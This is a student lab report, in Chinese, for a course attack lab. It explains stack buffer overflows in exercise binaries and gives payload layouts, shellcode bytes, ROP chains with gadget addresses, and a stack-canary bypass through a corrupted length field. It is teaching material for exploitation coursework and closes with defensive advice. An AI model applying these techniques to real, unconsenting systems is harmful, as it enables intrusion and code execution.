# Lab 3 Attack Lab 实验报告

姓名：严淅　　学号：24307140086　　日期：2026-11-17

实验环境：Ubuntu 24.04（WSL2），x86-64；gdb、objdump、readelf、Python 3.12。

## 一、观察 input 栈帧

先看 dark-calc。input 的入口是 `0x401977`，反汇编如下：

```asm
0x401977 <input>:  push rbp
0x401978           mov  rbp, rsp
0x40197b           sub  rsp, 0x10
0x401993           lea  rax, [rbp-0x10]
0x401997           mov  rdi, rax
0x40199a           call gets@plt
0x4019c3           lea  rax, [rbp-0x10]
0x4019ca           mov  edi, 0x6030d0      ; command_buf
0x4019cf           call strcpy@plt
0x4019d5           leave
0x4019d6           ret
```

在调用 gets 之前（`0x401993`）下断点，GDB 的输出是：

```text
rbp = 0x721000800fe0, rsp = 0x721000800fd0
buffer = rbp-0x10 = 0x721000800fd0
[rbp]   = 0x0000721000800ff0   ; saved rbp
[rbp+8] = 0x0000000000401ad1   ; saved rip (main+0xe)
0x721000800fd0: 0x0000000000000000  0x0000000000000000
```

expression 只有 16 字节。从缓冲区首地址往后数，偏移 16 是 saved rbp，偏移 24 是 saved rip。dark-calc-nx 的布局一样，只是栈地址会随 ASLR 变化。

| 地址（相对 rbp） | 内容 | 说明 |
| --- | --- | --- |
| rbp-0x10 ~ rbp-0x01 | expression[16] | gets 的写入目标 |
| rbp+0x00 | saved rbp | 偏移 16 |
| rbp+0x08 | saved rip | 偏移 24 |

## 二、不同长度输入测试

每次输入 n 个 `'A'`，末尾带一个换行，运行 dark-calc，记录退出状态：

| 长度 n | 退出状态 | 现象 |
| --- | --- | --- |
| 1 / 8 / 15 | 0 | 正常执行，EOF 后打印 answer |
| 16 / 17 / 23 | 0 | saved rbp 被覆盖，但 saved rip 未变，仍能返回 main |
| 24 | SIGBUS (-7) | NUL 覆盖 saved rip 最低字节，跳到 0x401a00 |
| 25 / 31 / 32 / 40 / 64 / 100 | SIGSEGV (-11) | saved rip 被覆盖为无效地址（32 时为 0x4141414141414141） |

长度不超过 15 时，字符串加上结尾的 NUL 最多 16 字节，刚好填满 expression[16]。长度在 16~23 之间时，saved rbp 已经被覆盖，saved rip 却还没动，input 仍能回到 main；main 和 eval 用的是自己的 rbp，所以程序可以继续跑，第二次 input 读到 EOF 后正常退出。可见偏移 16 对应 saved rbp，偏移 24 才到返回地址。

长度为 24 时，gets 补的 NUL 正好落在 saved rip 的最低位，返回地址从 `0x401ad1` 变成 `0x401a00`。这个地址在 eval 内部，执行 `mov [rbp-4],eax` 时 rbp 已经是 `0x4141414141414141`，访问非规范地址，进程收到 SIGBUS。从 25 开始，saved rip 被 `'A'` 逐步覆盖；到 32 字节时整个返回地址变成 `0x4141414141414141`，表现为 SIGSEGV。后面的 payload 都用 24 字节偏移来覆盖 saved rip。

## 三、利用缓冲区漏洞执行 ./malware

malware 是个 shell 脚本，会顺着父进程链往上找 dark-calc：

```bash
current_process=$$
while [ "$current_process" -ne 1 ]; do
    parent_process=$(ps -o ppid= -p $current_process)
    process_name=$(ps -o comm= -p $parent_process)
    if [ "$process_name" = "dark-calc" ]; then found_dark_calc=true; break; fi
    current_process=$parent_process
done
```

所以不能直接用 `execve("./malware")` 把 dark-calc 替换掉：替换之后进程名和父进程链里都没有 dark-calc，检查会失败。得让 dark-calc 通过 `system()` 起一个子进程。eval 里刚好有这段代码：

```asm
0x401a6b: mov edi, 0x6030d0      ; command_buf
0x401a70: call system@plt
0x401a75: ...                    ; fflush
0x401a85: leave
0x401a86: ret
```

input 返回之前会先执行 `strcpy(command_buf, expression)`。只要输入以 `"./malware"` 开头，command_buf 里就是这串字符。把 saved rip 改成 `0x401a6b`，程序就会执行 `system("./malware")`。saved rbp 设成 main 的 rbp（`0x721000800ff0`），system 返回后 eval 的 leave/ret 会回到 `__wrap_main`，进程正常退出。

| 偏移 | 内容 | 说明 |
| --- | --- | --- |
| 0 ~ 15 | `"./malware\0" + 'A'*6` | 填满 16 字节缓冲区，command_buf 得到 "./malware" |
| 16 ~ 23 | `0x721000800ff0` | 伪造 saved rbp = main 的 rbp |
| 24 ~ 31 | `0x401a6b` | saved rip -> system(command_buf) |

payload.py 生成 32 字节，运行后 stdout 输出：

```text
### The bomb was triggered by the dark-calc process. ###
### You have successfully detonated the bomb! Congratulations! ###
```

pstree 里能看到 `dark-calc -> sh -c -- ./malware -> malware` 这条父子链，bomb 是由 dark-calc 触发的。

## 四、用 GDB 检查 main 的机器码

在 GDB 里执行 `disassemble /r main` 和 `x/26xb main`，结果如下：

```asm
0x401ac3 <+0>:  55                  push rbp
0x401ac4 <+1>:  48 89 e5            mov rbp,rsp
0x401ac7 <+4>:  b8 00 00 00 00      mov eax,0x0
0x401acc <+9>:  e8 a6 fe ff ff      call 0x401977 <input>
0x401ad1 <+14>: b8 00 00 00 00      mov eax,0x0
0x401ad6 <+19>: e8 fc fe ff ff      call 0x4019d7 <eval>
0x401adb <+24>: eb ea               jmp 0x401ac7 <main+4>
```

```text
55 48 89 e5 b8 00 00 00 00 e8 a6 fe ff ff
b8 00 00 00 00 e8 fc fe ff ff eb ea
```

e8 是 call rel32，目标地址等于下一条指令地址加上符号扩展后的偏移。call input 算出来是 `0x401ad1 + 0xfffffea6 = 0x401977`；call eval 是 `0x401adb + 0xfffffefc = 0x4019d7`。eb 是 jmp rel8，`0x401add + 0xea = 0x401ac7`。main 就是 input -> eval -> jmp 的无限循环，没有栈保护。

## 五、栈空间执行

dark-calc 用 `--wrap=main` 把入口换成了 `__wrap_main`；它在调用 main 之前把 rsp 切到 `init_fixed_stack()` 建好的固定栈。反汇编出来的逻辑是：

```c
mmap(0x721000000000, 0x802000, PROT_READ|PROT_WRITE|PROT_EXEC,
     MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED_NOREPLACE, -1, 0);
mprotect(0x721000000000, 0x1000, PROT_NONE);      // 低端 guard
mprotect(0x721000801000, 0x1000, PROT_NONE);      // 高端 guard
fixed_stack_top = 0x721000801000;

__wrap_main:
    push r12
    mov  r12, rsp
    mov  rsp, [fixed_stack_top]
    call main
    mov  rsp, r12
    pop  r12
    ret
```

`info proc mappings` 里 `0x721000001000~0x721000801000` 的权限是 rwxp。rsp 固定在 `0x721000801000`，input 的 rbp 是 `0x721000800fe0`，缓冲区在 `0x721000800fd0`，shellcode 可以直接放在缓冲区里再返回到它。

```asm
6a 04                          push 4
5f                             pop rdi              ; rdi = 4
48 b8 87 1a 40 00 00 00 00 00  mov rax, 0x401a87    ; grade_eval
ff d0                          call rax
31 c0                          xor eax, eax
b0 3c                          mov al, 60           ; SYS_exit
31 ff                          xor edi, edi
0f 05                          syscall
```

shellcode 在 `0x7210...`，grade_eval 在 `0x401a87`，两者相差超过 2GB，call rel32 够不到，只能用 `mov rax, imm64` 再 `call rax`。shellcode 本身 23 字节，补一个 NOP 凑到 24 字节，偏移 24 处写回 `0x721000800fd0`。运行后打印 "Hope A will be your grade!"，退出状态 0。

## 六、ROP

dark-calc-nx 没有固定栈，`[stack]` 在 GDB 里是 rw-p，栈上的 shellcode 执行不了。程序不是 PIE，代码地址固定，可以直接用二进制里的 gadget：

| gadget / 函数 | 地址 | 用途 |
| --- | --- | --- |
| `ret` | `0x4018c7` | 调整栈对齐 |
| `pop rdi; ret` | `0x401a33` | 把 4 放进 RDI |
| `grade_eval` | `0x401978` | 目标函数 |
| `exit@plt` | `0x4016e0` | 正常退出 |

payload_rop.py 的链是这样：

```text
offset 0  : 'A' * 16                 ; expression[16]
offset 16 : 0x4242424242424242       ; saved rbp
offset 24 : 0x4018c7                 ; ret
offset 32 : 0x401a33                 ; pop rdi; ret
offset 40 : 4
offset 48 : 0x401978                 ; grade_eval
offset 56 : 0x401a33                 ; pop rdi; ret
offset 64 : 0
offset 72 : 0x4016e0                 ; exit@plt
```

input 的 ret 执行完，rsp 是 16 的倍数；链首多放一个 ret，把 grade_eval 入口的栈对齐到 SysV ABI 的要求。运行后打印 "Hope A will be your grade!"，退出状态 0。

## 七、Canary

dark-log 的 input 栈帧如下：

| 地址（相对 rbp） | 内容 | 说明 |
| --- | --- | --- |
| rbp-0x120 | f.expression[128] | gets 的写入目标 |
| rbp-0xa0 | f.logMsg[128] | memcpy 的目标基址 |
| rbp-0x20 | f.len | 偏移 0x100，可被 gets 覆盖 |
| rbp-0x08 | stack canary | 必须保持不变 |
| rbp+0x00 | saved rbp | |
| rbp+0x08 | saved rip | 返回地址 |

如果直接从 expression 写到 saved rip，中间会经过 rbp-0x08 的 canary；猜中的概率大约只有 2 的 56 次方分之一，爆破不现实。关键代码是：

```c
gets(f.expression);
memcpy(f.logMsg + f.len, f.expression, 128);
```

f.len 在 rbp-0x20，从 expression 起始地址算偏移是 0x100，落在 gets 能写到的范围里。把 f.len 改成 0xa8，memcpy 的目标就是 `(rbp-0xa0)+0xa8 = rbp+8`，也就是从 saved rip 开始往上写 128 字节，rbp-8 的 canary 就被跳过了。拷贝源是 f.expression 的前 128 字节，这 128 字节同时也就是 ROP 链。

GDB 里能看到 f.len=168（0xa8），dst=rbp+8；memcpy 前后 canary 都是 `0x1d55da47234f4200`，没有被改动；saved rip 被写成 `chain[0]=0x4017f4`。canary 检查通过之后才执行 leave/ret。

payload_canary.py 的布局是：偏移 0 放 ret（`0x4017f4`），8 放 `pop rdi; ret`（`0x4018a3`），16 放 4，24 放 grade_eval（`0x401677`），32 放 0；后面用 NOP 填到偏移 0x100，最后写 f.len=0xa8，总长 0x104 字节。运行后会打印 "Hope A will be your grade!"。打印完返回地址是 0，进程收到 SIGSEGV；dark-log 没有导入 exit，也没有 syscall gadget，这里就不追求干净退出了，CI 只看 stdout。

## 八、总结

四个 payload 都通过了测试：payload.py 触发 ./malware；payload_dark.py 在固定 RWX 栈上执行 shellcode；payload_rop.py 在 NX 栈上调用 grade_eval；payload_canary.py 用 f.len 跳过 canary，再调用 grade_eval。

这次实验里最容易看漏的是 dark-calc 的栈：readelf 的 GNU_STACK 标签只覆盖普通栈，真正拿来当栈用的那块是 `init_fixed_stack()` 自己 mmap 的 RWX 内存。另一个问题是 dark-log 的 memcpy，长度固定为 128，目标却由 f.len 决定，所以 canary 可以绕过。至于 gets，它不检查长度，偏移 24 就能改到返回地址。防御时应该换成 fgets、校验长度，打开 NX、PIE 和 Canary，并且不要让用户输入直接进 system。
